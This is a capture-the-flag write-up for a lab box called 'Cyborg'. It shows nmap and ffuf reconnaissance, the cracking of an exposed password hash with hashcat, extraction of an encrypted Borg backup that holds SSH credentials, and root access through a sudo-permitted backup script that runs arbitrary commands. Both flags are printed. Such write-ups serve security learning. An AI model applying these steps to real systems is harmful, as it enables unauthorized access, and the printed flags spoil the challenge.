# Cyborg
A box involving encrypted archives, source code analysis, and more.

### Resolution

We are given the IP address of the machine which will be referred to as $IP in the following `nmap` scan:
```
$ sudo nmap -sV -sC $IP
                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 15:58 UTC
Nmap scan report for 10.10.87.230
Host is up (0.077s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The machine runs a web server. We navigate to the hosted website and find out that it contains the default Apache page set up after initialization.

![771159b35c97e429247aac754ad44bf06cc1efa8](https://github.com/elomarii/ctf4day/assets/106914699/b04e3548-89f0-4adc-a732-1e13475c0e24)


We can enumerate for other content hosted by the machine.
```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u "http://10.10.87.230/FUZZ" 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.87.230/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 71ms]
etc                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 68ms]

```

We were able to find two directories. When navigating to the admin portal, we find a downloadable Borg backup of the website called.
The archive is encrypted and needs a passphrase for decryption.

Let's check the etc directory. This contains a configuration file of a Squid proxy and a passwd file.
The passwd file contains a hash of the `music_archive` user's password.
```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

We successfully crack the password using `hashcat` and the `rockyou` wordlist. The password is `squidward`.
```
$ hashcat -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt 

<...snip...>

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 7 secs

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward

<...snip...>

```

Back to our music archive, we find out that the backup was made using the above password, and now can recover the archive's data using `borg` command line utility.

To list all the backups in the archive:
```
$ borg list final_archive
  
Enter passphrase for key /home/kali/Downloads/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 14:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

Now let's extract the data. Note that the command is executed from `dev` sub-folder and that the output of the command will be written in the same location as well.
```
$ borg extract final_archive::music_archive
```

Content of the backup:
```
$ tree
.
└── alex
    ├── Desktop
    │   └── secret.txt
    ├── Documents
    │   └── note.txt
    ├── Downloads
    ├── Music
    ├── Pictures
    ├── Public
    ├── Templates
    └── Videos

```

The content of the secrete was a bit disappointing XD
```
shoutout to all the people who have gotten to this stage whoop whoop!"
```
However, the note is giving valuable information
```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

Since the above are Alex credentials, we can try connecting via ssh.

In the home directory, we find the user flag: `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`

Left is the root flag. Making use of the given hint "There might be an interesting file running as root" and checking our Alex permissions, we find that the script `backup.sh` can be run as a root.
```
$ sudo -l

Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

That script can execute any given command following the `-c` option. Using this we can enumerate files in the root repository.

```
$ sudo ./mp3backups/backup.sh -c "ls /root"

<...snip...>
Backup finished

root.txt
```

Finally the root flag: `flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`



